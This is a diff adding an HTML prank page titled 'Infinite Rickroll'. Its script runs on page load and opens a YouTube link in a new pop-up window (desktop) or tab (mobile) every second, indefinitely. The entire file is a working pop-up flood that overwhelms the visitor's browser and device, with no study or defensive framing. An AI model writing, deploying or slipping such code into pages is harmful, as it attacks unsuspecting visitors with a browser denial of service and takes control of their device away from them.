@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Infinite Rickroll</title>
+</head>
+<body>
+  <script>
+    const url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Rickroll link
+
+    // Detect if the device is desktop (Mac/Windows) or mobile
+    function isDesktop() {
+      return /Win|Mac/i.test(navigator.platform);
+    }
+
+    // Start the infinite opening based on device type
+    function startRickroll() {
+      if (isDesktop()) {
+        // On desktop, open pop-up windows
+        setInterval(() => {
+          window.open(url, "_blank", "width=600,height=400");
+        }, 1000); // opens a new pop-up window every second
+      } else {
+        // On mobile, open in new tabs
+        setInterval(() => {
+          window.open(url, "_blank");
+        }, 1000); // opens a new tab every second
+      }
+    }
+
+    // Run the Rickroll on page load
+    startRickroll();
+  </script>
+</body>
+</html>
